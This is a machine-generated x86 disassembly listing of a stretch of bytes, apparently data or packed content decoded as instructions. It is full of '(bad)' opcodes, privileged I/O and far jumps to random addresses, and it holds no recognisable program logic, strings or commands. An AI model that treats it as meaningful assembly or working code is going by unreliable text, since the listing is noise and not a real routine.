  414e0e:	in     al,dx
  414e0f:	push   ebx
  414e10:	mov    bh,0x2
  414e12:	or     al,0x1a
  414e14:	jl     0x414e0b
  414e16:	lds    ecx,FWORD PTR [edi-0x3f]
  414e19:	jno    0x414e40
  414e1b:	popa   
  414e1c:	xchg   esi,eax
  414e1d:	scas   eax,DWORD PTR es:[edi]
  414e1e:	in     al,0xe4
  414e20:	leave  
  414e21:	dec    ebp
  414e22:	and    cl,BYTE PTR [ecx]
  414e24:	jge    0x414e60
  414e26:	xor    eax,DWORD PTR [ebp-0x3e]
  414e29:	mov    al,BYTE PTR [edi]
  414e2b:	inc    esp
  414e2c:	and    BYTE PTR [esi-0x76],0x47
  414e30:	xchg   DWORD PTR [ebp+0x7d],esi
  414e33:	jmp    esp
  414e35:	jne    0x414e33
  414e37:	mov    ecx,0x46ff6277
  414e3c:	adc    al,0xd3
  414e3f:	stc    
  414e40:	inc    esp
  414e41:	xor    bh,al
  414e43:	dec    esp
  414e44:	loopne 0x414e51
  414e46:	cs repz out dx,al
  414e49:	jbe    0x414df1
  414e4b:	pop    edx
  414e4c:	data16 adc BYTE PTR [edi+0x6cb0770],0xfa
  414e54:	outs   dx,BYTE PTR ds:[esi]
  414e55:	xchg   esp,eax
  414e56:	outs   dx,BYTE PTR ds:[esi]
  414e57:	test   eax,0x8eb4512a
  414e5c:	out    0x4e,al
  414e5e:	sub    ah,ch
  414e60:	std    
  414e61:	test   al,0x1e
  414e63:	icebp  
  414e64:	aas    
  414e65:	ret    0x5f27
  414e68:	ret    
  414e69:	fs stos BYTE PTR es:[edi],al
  414e6b:	gs sub al,0x88
  414e6e:	mov    BYTE PTR [edx+0x7c],0xe7
  414e72:	jns    0x414e63
  414e74:	xor    ebx,DWORD PTR [edi+0x7e]
  414e77:	cmc    
  414e78:	push   ecx
  414e79:	and    esp,DWORD PTR [esi+0x6]
  414e7c:	fnstsw WORD PTR [eax+0x22]
  414e7f:	call   0x3708:0x625f20f2
  414e86:	aas    
  414e87:	lods   eax,DWORD PTR ds:[esi]
  414e88:	and    eax,0xcea935b3
  414e8d:	stos   BYTE PTR es:[edi],al
  414e8e:	and    eax,edi
  414e90:	inc    edx
  414e91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e92:	and    cl,BYTE PTR ds:0x9dc03968
  414e98:	add    DWORD PTR [esi+eiz*2-0xf],edx
  414e9c:	(bad)  
  414e9e:	in     eax,dx
  414e9f:	mov    ebx,0x4fe308bd
  414ea4:	xor    ecx,eax
  414ea6:	(bad)  
  414ea7:	push   0xd968465a
  414eac:	aas    
  414ead:	jne    0x414e52
  414eaf:	loop   0x414e83
  414eb1:	push   ds
  414eb2:	inc    ebx
  414eb3:	add    bh,0x0
	...
  414f16:	aaa    
  414f17:	data16 xor al,0x9b
  414f1a:	jne    0x414ef7
  414f1c:	mov    edi,0x6e73ee
  414f21:	xchg   ebp,eax
  414f22:	jae    0x414ec2
  414f24:	in     al,dx
  414f25:	xor    bh,BYTE PTR [edx]
  414f27:	fiadd  DWORD PTR [eax]
  414f29:	add    BYTE PTR [edi],al
  414f2b:	add    DWORD PTR [eax],eax
  414f2d:	add    ah,bl
  414f2f:	dec    esi
  414f30:	mov    cl,0xbd
  414f32:	scas   eax,DWORD PTR es:[edi]
  414f33:	cdq    
  414f34:	loope  0x414f70
  414f36:	(bad)  
  414f37:	in     eax,0x3
  414f39:	fcomp  st(7)
  414f3b:	ins    BYTE PTR es:[edi],dx
  414f3c:	sub    al,0x0
  414f3e:	mov    esi,DWORD PTR ds:[ecx-0x753d64f7]
  414f45:	add    DWORD PTR [esi],ecx
  414f47:	pop    eax
  414f48:	cmp    cl,dh
  414f4a:	add    al,0xae
  414f4c:	pop    esi
  414f4d:	pop    esi
  414f4e:	jge    0x414ef7
  414f50:	or     BYTE PTR [edx+edx*2+0x3f],bl
  414f54:	xchg   BYTE PTR [edx-0x2a],al
  414f57:	enterw 0xbbac,0x8d
  414f5c:	and    BYTE PTR [esi+edi*4],ah
  414f5f:	aam    0xda
  414f61:	pop    ebp
  414f62:	mov    ebp,0x2089483a
  414f67:	add    bl,BYTE PTR [esi-0x1]
  414f6a:	cmp    cl,BYTE PTR [edx]
  414f6c:	lahf   
  414f6d:	cmc    
  414f6e:	adc    cl,BYTE PTR [ebx+0x56]
  414f71:	pop    ebp
  414f72:	and    DWORD PTR [esi],edx
  414f74:	and    BYTE PTR [edx+0x57],0x1
  414f78:	pop    edx
  414f79:	cmp    dh,0x88
  414f7c:	xor    BYTE PTR [esi-0x14a7d17d],bh
  414f82:	sar    dh,cl
  414f84:	xchg   ebx,eax
  414f85:	xor    esp,DWORD PTR [ecx]
  414f87:	ret    
  414f88:	lock (bad) 
  414f8a:	cmp    DWORD PTR [edi],ecx
  414f8c:	cmp    BYTE PTR [edx],dh
  414f8e:	jne    0x414f6a
  414f90:	or     BYTE PTR [edi+esi*1],al
  414f93:	pop    esp
  414f94:	cmc    
  414f95:	mov    DWORD PTR cs:[edi+0x6c],ebp
  414f99:	pop    ebx
  414f9a:	pop    es
  414f9b:	icebp  
  414f9c:	cdq    
  414f9d:	mov    bl,ch
  414f9f:	das    
  414fa0:	arpl   di,dx
  414fa2:	jae    0x414fc6
  414fa4:	push   edx
  414fa5:	and    BYTE PTR [edx+0x9],0x4
  414fa9:	fisubr DWORD PTR [edi+ebx*8-0x6760a2c5]
  414fb0:	sub    al,0x64
  414fb2:	stc    
  414fb3:	xchg   edi,eax
  414fb4:	push   0xffffff9a
  414fb6:	add    BYTE PTR [ecx],ah
  414fb8:	pop    esp
  414fb9:	stc    
  414fba:	jmp    0x4b0a:0x16299bc
  414fc1:	adc    dl,BYTE PTR [ecx]
  414fc3:	out    0xf9,eax
  414fc5:	test   edx,0x1041cb75
  414fcb:	out    0x91,eax
  414fcd:	ins    DWORD PTR es:[edi],dx
  414fce:	test   DWORD PTR [eax+0x2425e84a],ebx
  414fd4:	repnz add al,0xcc
  414fd7:	pop    ecx
  414fd8:	pop    ebx
  414fd9:	inc    edx
  414fda:	push   es
  414fdb:	popa   
  414fdc:	inc    esp
  414fdd:	dec    esi
  414fde:	mov    eax,ds:0x9640caa0
  414fe3:	adc    edx,ecx
  414fe5:	pop    es
  414fe6:	pop    ds
  414fe7:	jo     0x41502a
  414fe9:	add    DWORD PTR [esi],edi
  414feb:	outs   dx,BYTE PTR ds:[esi]
  414fec:	fnstcw WORD PTR [eax+0x52c5af13]
  414ff2:	test   BYTE PTR [ecx+0x11],0xa5
  414ff6:	push   ebx
  414ff7:	inc    ebx
  414ff8:	jg     0x415026
  414ffa:	test   eax,0x4d3507cc
  414fff:	mov    ch,0xc
  415001:	shl    DWORD PTR [ecx-0x3021175f],cl
  415007:	clc    
  415008:	popa   
  415009:	xchg   ebp,eax
  41500a:	or     cl,BYTE PTR [edi-0x22]
  41500d:	cwde   
  41500e:	aaa    
  41500f:	int3   
  415010:	sub    dl,cl
  415012:	jg     0x414ff5
  415014:	ins    DWORD PTR es:[edi],dx
  415015:	or     al,0x49
  415017:	sub    DWORD PTR [edx],esi
  415019:	rcl    DWORD PTR [ecx+0x718fb2b8],1
  41501f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415020:	xchg   ebx,eax
  415021:	mov    al,BYTE PTR ds:0x22d69fa5
  415027:	jnp    0x414fd1
  415029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41502a:	iret   
  41502b:	outs   dx,DWORD PTR ds:[esi]
  41502c:	dec    ebx
  41502d:	jnp    0x41505f
  41502f:	jns    0x414ffb
  415031:	and    eax,0x467332
	...
  415096:	jnp    0x41509a
  415098:	add    ebp,ebx
  41509a:	jnp    0x415087
  41509c:	sti    
  41509d:	xchg   edx,eax
  41509e:	and    BYTE PTR [ebx],ah
  4150a0:	pushf  
  4150a1:	test   eax,0x8d79ffb7
  4150a6:	inc    ecx
  4150a7:	fild   DWORD PTR [eax]
  4150a9:	add    BYTE PTR [edi],al
  4150ab:	add    DWORD PTR [eax],eax
  4150ad:	add    BYTE PTR [edx],cl
  4150af:	out    dx,eax
  4150b0:	call   0x4017:0xf5bf9282
  4150b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150b8:	dec    esp
  4150b9:	cmp    ebx,DWORD PTR [ebx-0x3d701f59]
  4150bf:	mov    eax,ds:0xc494c164
  4150c4:	push   eax
  4150c5:	test   eax,0xfdb621f2
  4150ca:	(bad)  
  4150cb:	mov    esi,0x5368ba12
  4150d0:	sub    bl,ah
  4150d2:	sbb    eax,0x64af2b2d
  4150d7:	fwait
  4150d8:	xchg   esi,eax
  4150d9:	(bad)  
  4150da:	or     BYTE PTR [edx],ch
  4150dc:	jg     0x415128
  4150de:	mov    ecx,0xc54c7c00
  4150e3:	mov    edx,0x65d1d0e9
  4150e8:	lock fldcw WORD PTR [esi-0x46]
  4150ec:	jge    0x415121
  4150ee:	cmp    al,0xe3
  4150f0:	adc    al,0xfe
  4150f2:	push   ebp
  4150f3:	cmp    DWORD PTR [ebp+ecx*2-0x7f],0x57
  4150f8:	mov    ebx,DWORD PTR [edx]
  4150fa:	in     al,dx
  4150fb:	push   ss
  4150fc:	sub    BYTE PTR [eax],ch
  4150fe:	out    dx,al
  4150ff:	xor    dh,BYTE PTR [edi-0x38de4bca]
  415105:	loope  0x4150b7
  415107:	xor    dh,cl
  415109:	(bad)  
  41510a:	ror    BYTE PTR ds:0xd4ef2c6f,1
  415110:	add    BYTE PTR [edx-0x74],cl
  415113:	pusha  
  415114:	and    DWORD PTR [edx+0x73],ebx
  415117:	icebp  
  415118:	push   ss
  415119:	pushf  
  41511a:	mov    esi,0x5f076ff0
  41511f:	mov    bl,BYTE PTR [edi+0x79]
  415122:	mov    ds:0xd52f6a6,eax
  415127:	popa   
  415128:	imul   esi,DWORD PTR [eax+0x1c847e4c],0x66
  41512f:	pop    DWORD PTR [edx+0x7d]
  415132:	addr16 loopne 0x415114
  415135:	outs   dx,DWORD PTR ds:[esi]
  415136:	xlat   BYTE PTR ds:[ebx]
  415137:	jae    0x415181
  415139:	call   0x912af67d
  41513e:	sbb    eax,0x86b57e15
  415143:	loopne 0x415139
  415145:	retf   0x7f2f
  415148:	adc    edi,DWORD PTR [edi]
  41514a:	(bad)  
  41514b:	cli    
  41514c:	mov    esp,0xa7bbbfec
  415151:	mov    ecx,0x4012768c
  415156:	mov    dh,BYTE PTR [edi-0x7ab762c1]
  41515c:	pop    eax
  41515d:	sbb    al,0xac
  41515f:	sar    DWORD PTR [ecx+ecx*4],1
  415162:	jnp    0x415131
  415164:	aas    
  415165:	iret   
  415166:	data16 test al,0xd3
  415169:	dec    edi
  41516a:	shr    DWORD PTR [edi+0x12488f39],cl
  415170:	das    
  415171:	pop    ebx
  415172:	push   esi
  415173:	push   edx
  415174:	xchg   esi,eax
  415175:	or     esi,DWORD PTR [eax+0x34822be3]
  41517b:	repnz hlt 
  41517d:	pop    edx
  41517e:	sbb    ecx,DWORD PTR [ebp+eax*2-0xec045e2]
  415185:	leave  
  415186:	sub    ebx,DWORD PTR [edx-0x1313677a]
  41518c:	imul   esp,DWORD PTR [ecx+0x61fbec4e],0xffffff95
  415193:	lahf   
  415194:	mov    ecx,0x66548a7d
  415199:	aam    0x7f
  41519b:	test   ebp,ebx
  41519d:	(bad)  
  41519e:	dec    edx
  41519f:	xor    edi,DWORD PTR [edi+edx*1+0x21]
  4151a3:	or     dl,BYTE PTR [edi]
  4151a5:	dec    esp
  4151a6:	inc    edi
  4151a7:	int3   
  4151a8:	inc    eax
  4151a9:	ins    DWORD PTR es:[edi],dx
  4151aa:	neg    BYTE PTR [ebx-0x6453a49f]
  4151b0:	jg     0x41518f
  4151b2:	jmp    0x415153
  4151b4:	sbb    al,BYTE PTR [eax]
	...
  415216:	sub    al,0x97
  415218:	pop    ds
  415219:	sar    DWORD PTR [edi+0xffeed9],1
  41521f:	lods   eax,DWORD PTR ds:[esi]
  415220:	std    
  415221:	mov    al,0x59
  415223:	lea    edx,ds:0xdc48d2
  415229:	add    BYTE PTR [edi],al
  41522b:	add    DWORD PTR [eax],eax
  41522d:	add    BYTE PTR [ecx+0x65],dh
  415230:	adc    ebx,DWORD PTR [edi+0x5469e5cc]
  415236:	pop    edx
  415237:	sub    al,0x10
  415239:	xor    al,BYTE PTR [ebp+0x64]
  41523c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41523d:	loop   0x4152ba
  41523f:	jo     0x415228
  415241:	adc    ch,BYTE PTR [ebp-0xf]
  415244:	mov    al,ds:0x4dc3853b
  415249:	mov    al,ds:0xf97c812e
  41524e:	mov    WORD PTR ds:0xe795,ds
  415253:	inc    edi
  415254:	add    eax,0x4679f6e2
  415259:	push   ecx
  41525a:	leave  
  41525b:	pop    ds
  41525c:	repnz or edi,ebp
  41525f:	stc    
  415260:	push   eax
  415261:	push   ecx
  415262:	mov    ds:0x1889e9c9,eax
  415267:	push   ebx
  415268:	lock rcr BYTE PTR [edi+ecx*2-0x58],0x94
  41526e:	inc    ebp
  41526f:	clc    
  415270:	(bad)  
  415271:	clc    
  415272:	ja     0x41527a
  415274:	cli    
  415275:	and    BYTE PTR ds:0xfeec63ec,bl
  41527b:	(bad)  
  41527c:	icebp  
  41527d:	test   eax,0xe94bb323
  415282:	dec    esp
  415283:	sbb    ah,BYTE PTR [eax-0x73289b98]
  415289:	push   ebp
  41528a:	fwait
  41528b:	std    
  41528c:	mov    ecx,0x880d79d8
  415291:	xchg   ebx,eax
  415292:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415293:	pop    edi
  415294:	and    dh,bl
  415296:	dec    ecx
  415297:	fdiv   DWORD PTR [ecx]
  415299:	jecxz  0x415234
  41529b:	test   al,0x35
  41529d:	push   eax
  41529e:	cs rcr DWORD PTR es:[edi-0x6086eff6],cl
  4152a6:	cdq    
  4152a7:	daa    
  4152a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152a9:	pop    esi
  4152aa:	(bad)  
  4152ab:	outs   dx,BYTE PTR ds:[esi]
  4152ac:	adc    bl,BYTE PTR [edx]
  4152ae:	retf   0xe63
  4152b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152b2:	fistp  WORD PTR [eax]
  4152b4:	sahf   
  4152b5:	imul   ecx,esp,0x397823ed
  4152bb:	sbb    edx,DWORD PTR [ecx]
  4152bd:	int    0xd2
  4152bf:	rol    BYTE PTR [ebp+0x63badf60],0x96
  4152c6:	scas   al,BYTE PTR es:[edi]
  4152c7:	fsubr  QWORD PTR gs:[eax+0x4f]
  4152cb:	mov    ch,bl
  4152cd:	mov    ebx,0xb485d42b
  4152d2:	js     0x415287
  4152d4:	adc    ebp,DWORD PTR [eax+0x79a8db0d]
  4152da:	xor    esi,esi
  4152dc:	jle    0x4152fb
  4152de:	mov    WORD PTR [ecx-0x2b],?
  4152e1:	xor    ah,BYTE PTR [eax+ecx*2+0x69]
  4152e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152e6:	aaa    
  4152e7:	dec    ecx
  4152e8:	sub    al,0x30
  4152ea:	jge    0x415337
  4152ec:	data16 hlt 
  4152ee:	(bad)  
  4152ef:	fldcw  WORD PTR [esi+0x2a9bc237]
  4152f5:	xchg   esp,eax
  4152f6:	or     esp,ecx
  4152f8:	mov    DWORD PTR ds:0x88e2f88,ebp
  4152fe:	dec    ebp
  4152ff:	cld    
  415300:	rcl    BYTE PTR [edx],cl
  415302:	aad    0xc6
  415304:	dec    eax
  415305:	adc    ecx,DWORD PTR [esi-0x5f]
  415308:	lods   eax,DWORD PTR ds:[esi]
  415309:	mov    ah,0xc3
  41530b:	jne    0x415377
  41530d:	push   0x40
  41530f:	cmp    bh,ah
  415311:	jecxz  0x41533f
  415313:	and    ebx,DWORD PTR [eax-0x39ec127f]
  415319:	retf   0x88bc
  41531c:	push   edi
  41531d:	sti    
  41531e:	lea    ebp,[esi]
  415320:	pop    ebp
  415321:	pop    es
  415322:	stos   DWORD PTR es:[edi],eax
  415323:	mov    edi,0xe6bb0890
  415328:	aas    
  415329:	or     DWORD PTR [eax-0x34],edx
  41532c:	(bad)  
  41532d:	and    DWORD PTR [eax-0x7bc83183],edx
  415333:	imul   ebp,DWORD PTR [ebx+0x0],0x0
	...
  415393:	add    BYTE PTR [eax],al
  415395:	add    BYTE PTR [ebp-0x10],ch
  415398:	repz jmp FWORD PTR cs:[edi]
  41539c:	std    
  41539d:	repz mov ebx,0x184b9b2a
  4153a3:	(bad)  
  4153a4:	pusha  
  4153a5:	in     al,dx
  4153a6:	dec    edi
  4153a7:	fld    QWORD PTR [eax]
  4153a9:	add    BYTE PTR [edi],al
  4153ab:	add    DWORD PTR [eax],eax
  4153ad:	add    bl,dh
  4153af:	mul    DWORD PTR [edx-0x43]
  4153b2:	add    DWORD PTR [ecx+0x5d],eax
  4153b5:	mov    ecx,0xf288541e
  4153ba:	fsubp  st(5),st
  4153bc:	bound  edi,QWORD PTR [edx]
  4153be:	iret   
  4153bf:	pop    ss
  4153c0:	add    edx,DWORD PTR [ebx]
  4153c2:	xchg   edi,eax
  4153c3:	sbb    al,0xb5
  4153c5:	dec    ebx
  4153c6:	sahf   
  4153c7:	sub    edi,eax
  4153c9:	mov    dh,0x7
  4153cb:	dec    ebx
  4153cc:	mov    edi,0x14429d6d
  4153d1:	sub    BYTE PTR [ecx],bl
  4153d3:	lahf   
  4153d4:	enter  0xdbca,0x3b
  4153d8:	mov    ebx,DWORD PTR [esp+edx*1]
  4153db:	cmp    BYTE PTR [ebx-0x72c64b97],bh
  4153e1:	xor    DWORD PTR [edx],0x8485a21a
  4153e7:	and    esp,DWORD PTR [eax]
  4153e9:	test   DWORD PTR [esi-0x243111ba],ebp
  4153ef:	jp     0x4153cc
  4153f1:	sub    DWORD PTR [ecx-0x62ac01b5],0xfffffff0
  4153f8:	jg     0x4153b5
  4153fa:	sbb    ch,dl
  4153fc:	rcr    DWORD PTR [edi+0x31deba37],1
  415402:	xlat   BYTE PTR ds:[ebx]
  415403:	sbb    ah,BYTE PTR [esi+0x74b6a861]
  415409:	push   eax
  41540a:	add    bl,BYTE PTR [ebp-0x1d]
  41540d:	xor    cl,0x35
  415410:	cmp    eax,0x9dd36847
  415415:	arpl   WORD PTR [edx-0x5a],dx
  415418:	add    al,0x9b
  41541a:	test   DWORD PTR [eax+edi*8],ebp
  41541d:	jg     0x415487
  41541f:	mov    esi,0x8cbdd682
  415424:	inc    ebp
  415425:	aaa    
  415426:	pop    ebp
  415427:	into   
  415428:	mov    al,0xf2
  41542a:	icebp  
  41542b:	push   es
  41542c:	sti    
  41542d:	add    BYTE PTR [esi-0x36f1590f],ah
  415433:	(bad)  
  415434:	pop    eax
  415435:	cmp    eax,0x69259a89
  41543a:	addr16 imul ecx,edi,0x1
  41543e:	pop    ebx
  41543f:	imul   edi,DWORD PTR [esi+edi*1-0x33],0x75
  415444:	pop    es
  415445:	sbb    ebp,0xb01ef810
  41544b:	inc    eax
  41544c:	xor    cl,BYTE PTR ds:0xa018083b
  415452:	sbb    DWORD PTR [esi],edx
  415454:	jbe    0x41548b
  415456:	loop   0x41543e
  415458:	mov    ecx,0xca6bc58f
  41545d:	gs ss hlt 
  415460:	inc    ebp
  415461:	cmp    BYTE PTR [ecx-0x22],dh
  415464:	jle    0x41543d
  415466:	xor    esp,ebp
  415468:	push   esi
  415469:	dec    ecx
  41546a:	mov    ecx,0x9deb2b0
  41546f:	sbb    cl,BYTE PTR [ecx]
  415471:	mov    ch,0x45
  415473:	mov    ah,0x8d
  415475:	shl    BYTE PTR [esi-0x2b],0xb7
  415479:	xor    BYTE PTR [esi],cl
  41547b:	mov    bh,0x99
  41547d:	ins    DWORD PTR es:[edi],dx
  41547e:	inc    edi
  41547f:	add    DWORD PTR [ebx-0x49],edx
  415482:	int3   
  415483:	sar    ah,1
  415485:	leave  
  415486:	sbb    edi,DWORD PTR [esi]
  415488:	adc    dl,BYTE PTR [edx-0x47f7735e]
  41548e:	jae    0x415489
  415490:	or     edi,DWORD PTR [ebp-0x1480a037]
  415496:	cmp    al,0xf5
  415498:	nop
  415499:	mov    WORD PTR ds:0x75308708,cs
  41549f:	adc    BYTE PTR [ecx-0x64865e85],bl
  4154a5:	neg    BYTE PTR [edi+0x2a]
  4154a8:	out    dx,eax
  4154a9:	nop
  4154aa:	daa    
  4154ab:	enter  0x8a78,0xa3
  4154af:	push   edx
  4154b0:	pop    eax
  4154b1:	jecxz  0x415454
  4154b3:	push   edx
  4154b4:	or     eax,DWORD PTR [eax]
	...
  415516:	in     al,0xf0
  415518:	sub    DWORD PTR [edx],ecx
  41551a:	cmp    eax,0xc0fee7db
  41551f:	cmp    ebx,DWORD PTR [edi]
  415521:	pop    esp
  415522:	repnz cwde 
  415524:	jmp    0x700:0xde563b
  41552b:	add    DWORD PTR [eax],eax
  41552d:	add    BYTE PTR [ecx+0x2ab04086],ch
  415533:	xchg   DWORD PTR [edi-0x2c],esi
  415536:	outs   dx,BYTE PTR ds:[esi]
  415537:	pop    ebp
  415538:	(bad)  
  415539:	mov    ebp,0x1620757
  41553e:	(bad)  
  41553f:	dec    DWORD PTR [edx+esi*8-0x1d4c8270]
  415546:	fimul  WORD PTR [ebx]
  415548:	ins    DWORD PTR es:[edi],dx
  415549:	push   ecx
  41554a:	and    DWORD PTR es:[eax],ebp
  41554d:	and    eax,0xf10c9b26
  415552:	cs rol ch,0xfb
  415556:	imul   esp,DWORD PTR es:[eax-0x7b3deabb],0x11
  41555e:	stc    
  41555f:	adc    bh,dl
  415561:	push   0x56
  415563:	retf   0xa2dc
  415566:	jle    0x415534
  415568:	ror    BYTE PTR [eax-0x12],1
  41556b:	add    DWORD PTR [edx+0x41],edi
  41556e:	lods   eax,DWORD PTR ds:[esi]
  41556f:	adc    eax,0xe50ea2ba
  415574:	mov    ecx,es
  415576:	mov    eax,0xff9fae81
  41557b:	xchg   esi,eax
  41557c:	(bad)  
  41557d:	popa   
  41557e:	jae    0x415551
  415580:	ins    BYTE PTR es:[edi],dx
  415581:	(bad)  
  415582:	imul   edx,DWORD PTR [edi],0x6e
  415585:	outs   dx,BYTE PTR ds:[esi]
  415586:	dec    esi
  415587:	les    ebx,FWORD PTR [ebp+0x75631816]
  41558d:	popf   
  41558e:	jo     0x4155d3
  415590:	xor    bh,0xb5
  415593:	inc    eax
  415594:	lds    eax,FWORD PTR [ecx]
  415596:	ja     0x4155b5
  415598:	cdq    
  415599:	lods   eax,DWORD PTR ds:[esi]
  41559a:	nop
  41559b:	fbstp  TBYTE PTR [edx]
  41559d:	push   ss
  41559e:	fwait
  41559f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155a0:	adc    al,0xa
  4155a2:	inc    esi
  4155a3:	mov    esp,0xc7044466
  4155a8:	(bad)  
  4155a9:	clc    
  4155aa:	test   al,0x3c
  4155ac:	hlt    
  4155ad:	in     eax,0x91
  4155af:	and    edx,DWORD PTR [esi]
  4155b1:	icebp  
  4155b2:	jmp    0xf530:0x812d0b32
  4155b9:	xor    DWORD PTR [esi+0xf8f470f],eax
  4155bf:	mov    edx,0x1d5ac771
  4155c4:	idiv   BYTE PTR [eax-0x77]
  4155c7:	out    dx,eax
  4155c8:	sub    ah,BYTE PTR gs:[edi+esi*8-0x4c4fdd57]
  4155d0:	add    DWORD PTR [edi+edi*2+0x18],eax
  4155d4:	mov    cl,BYTE PTR [ecx+0x2b4999c]
  4155da:	mov    bh,0xcf
  4155dc:	daa    
  4155dd:	les    esi,FWORD PTR [esi-0xb0d6776]
  4155e3:	xchg   bx,ax
  4155e5:	xchg   esi,eax
  4155e6:	xor    BYTE PTR [esi-0x74],ah
  4155e9:	xor    edx,DWORD PTR [ebx+0x69688825]
  4155ef:	pop    ecx
  4155f0:	into   
  4155f1:	push   cs
  4155f2:	out    0x62,al
  4155f4:	xchg   esp,eax
  4155f5:	jae    0x415652
  4155f7:	loop   0x415587
  4155f9:	data16 neg BYTE PTR [ecx+0x41]
  4155fd:	icebp  
  4155fe:	iret   
  4155ff:	add    DWORD PTR [eax-0x68ad745f],0xffffff90
  415606:	daa    
  415607:	xchg   edi,eax
  415608:	lahf   
  415609:	bound  cx,DWORD PTR [ecx-0x5f]
  41560d:	test   al,0x13
  41560f:	add    DWORD PTR [ebp+0x6f0acdac],edx
  415615:	jmp    0x3b5efea1
  41561a:	(bad)  
  41561b:	lock scas eax,DWORD PTR es:[edi]
  41561d:	adc    eax,0xf6cdb302
  415622:	fldenv [esi+0x64d4e937]
  415628:	mov    DWORD PTR [eax+ecx*8+0x5ad16356],esi
  41562f:	xchg   esi,eax
  415630:	gs xchg edx,eax
  415632:	pop    edi
  415633:	push   eax
  415634:	out    dx,al
	...
  415695:	add    BYTE PTR [ebp-0x66],ch
  415698:	mov    esp,0xfd67ff45
  41569d:	mov    edx,0xaffd40cb
  4156a2:	jae    0x415633
  4156a4:	mov    ebx,0xdf5dbd
  4156a9:	add    BYTE PTR [edi],al
  4156ab:	add    DWORD PTR [eax],eax
  4156ad:	add    BYTE PTR [ebx-0x70],cl
  4156b0:	push   cs
  4156b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156b2:	imul   esi,DWORD PTR [edi+0x46433952],0x715c3174
  4156bc:	mov    gs:0x9a3b2c78,eax
  4156c2:	jle    0x415733
  4156c4:	leave  
  4156c5:	jo     0x4156b7
  4156c7:	push   es
  4156c8:	jb     0x415662
  4156ca:	not    DWORD PTR [eax+0x7c]
  4156cd:	fmulp  st(2),st
  4156cf:	jmp    0x41570c
  4156d1:	dec    ebp
  4156d2:	cmp    edi,ebp
  4156d4:	mov    ch,0xc9
  4156d7:	retf   0xd955
  4156da:	inc    edi
  4156db:	push   edi
  4156dc:	(bad)  
  4156dd:	sbb    al,bl
  4156df:	pop    dx
  4156e1:	mov    esp,0xf2699cef
  4156e6:	rcr    DWORD PTR [ecx-0x7844e665],cl
  4156ec:	mov    esp,0x3ca13a83
  4156f1:	aas    
  4156f2:	test   al,0xa9
  4156f4:	or     BYTE PTR [eax+0x12],al
  4156f7:	pop    ds
  4156f8:	retf   0x6777
  4156fb:	cvtps2pi mm7,QWORD PTR [esi-0x21bfc530]
  415702:	add    al,0x3a
  415704:	aam    0x4c
  415706:	xchg   ebp,eax
  415707:	jnp    0x4156d5
  415709:	adc    edi,DWORD PTR [eax]
  41570b:	outs   dx,DWORD PTR ds:[esi]
  41570c:	dec    esi
  41570d:	xlat   BYTE PTR ds:[ebx]
  41570e:	inc    eax
  41570f:	and    ebx,DWORD PTR [ebp-0x1c]
  415712:	(bad)  
  415714:	ja     0x415736
  415716:	arpl   WORD PTR [eax-0x3b],si
  415719:	and    DWORD PTR [ebx-0xd],eax
  41571c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41571d:	mov    WORD PTR [ebx-0x1704f09a],ss
  415723:	xor    eax,0x8ee3c921
  415728:	enter  0xd46a,0xdd
  41572c:	aad    0x81
  41572e:	xchg   BYTE PTR [eax+edi*1-0x4e0ad9f0],dl
  415735:	in     al,dx
  415736:	jmp    DWORD PTR [eax]
  415738:	test   DWORD PTR [eax+0x567ea1e7],0xb33ffedc
  415742:	xchg   bx,ax
  415744:	or     ch,BYTE PTR [esi+edx*8-0x20]
  415748:	pop    eax
  415749:	les    eax,FWORD PTR [edx-0x584635e0]
  41574f:	push   edi
  415750:	arpl   WORD PTR [edx+0x45],cx
  415753:	jae    0x415720
  415755:	jg     0x41575f
  415757:	xchg   edi,eax
  415758:	add    BYTE PTR [edi],al
  41575a:	inc    ebp
  41575b:	sbb    cl,BYTE PTR [edi+0x14]
  41575e:	dec    ebx
  41575f:	ins    BYTE PTR es:[edi],dx
  415760:	rcl    esp,1
  415762:	fisub  DWORD PTR [eax+ecx*1]
  415765:	mov    BYTE PTR [ebx+edx*8+0x13],dh
  415769:	arpl   WORD PTR [ebx],bx
  41576b:	xchg   esp,eax
  41576c:	xor    eax,0x47cf4ff8
  415771:	mov    cl,0x0
  415773:	rcl    bh,1
  415775:	adc    BYTE PTR [esp+esi*2],dh
  415778:	add    edi,DWORD PTR [ebp+0x67c03382]
  41577e:	cmp    BYTE PTR [esi+0x14b0370b],0x85
  415785:	ins    BYTE PTR es:[edi],dx
  415786:	jnp    0x41575a
  415788:	or     edi,DWORD PTR [eax+0x3c8fe126]
  41578e:	mov    ah,0xf8
  415790:	fbld   TBYTE PTR [eax+0x55a5776c]
  415796:	not    DWORD PTR [eax-0x10]
  415799:	fs loope 0x4157f4
  41579c:	cmp    eax,0x34f53781
  4157a1:	mov    ah,0x17
  4157a3:	int3   
  4157a4:	inc    edx
  4157a5:	xor    eax,ecx
  4157a7:	pop    ebp
  4157a8:	mov    cl,0x7a
  4157aa:	repnz xchg ebx,eax
  4157ac:	adc    BYTE PTR [ebp-0x42],bl
  4157af:	or     al,0x54
  4157b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157b2:	push   ebp
  4157b3:	jo     0x41577c
	...
  415815:	add    bl,cl
  415817:	(bad)  
  415818:	xchg   ebx,eax
  415819:	in     al,dx
  41581a:	mov    bh,0xed
  41581c:	(bad)  
  41581d:	inc    DWORD PTR [ecx-0x7551961d]
  415823:	in     eax,0xaa
  415825:	xor    eax,0xe064
  41582a:	pop    es
  41582b:	add    DWORD PTR [eax],eax
  41582d:	add    BYTE PTR [ebx+edi*1],ah
  415830:	out    0xbb,al
  415832:	outs   dx,DWORD PTR ds:[esi]
  415833:	pop    edx
  415834:	in     al,0x92
  415836:	sbb    al,0x85
  415838:	inc    ebp
  415839:	xchg   edi,eax
  41583a:	add    al,ch
